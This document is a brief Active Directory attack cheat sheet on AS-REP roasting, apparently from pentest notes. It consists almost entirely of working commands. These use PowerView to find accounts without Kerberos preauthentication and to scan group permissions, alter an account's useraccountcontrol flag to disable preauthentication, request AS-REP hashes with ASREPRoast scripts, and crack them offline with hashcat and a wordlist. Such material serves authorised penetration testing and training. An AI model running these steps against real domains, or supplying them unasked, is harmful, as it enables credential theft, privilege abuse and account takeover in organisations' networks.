# AS-REPS Roasting

**Enumerating accounts with kerberos preauth disabled**

```
. .\Powerview_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```

```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

**Enumerate permissions for group**

```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

**Set preauth not required**

```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

**Request encrypted AS-REP**

```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

**Enumerate all users with kerberos preauth disabled and request a hash**

```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

**Crack the hash with hashcat**

Edit the hash by inserting '23' after the krb5asrep, so krb5asrep.......

```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```
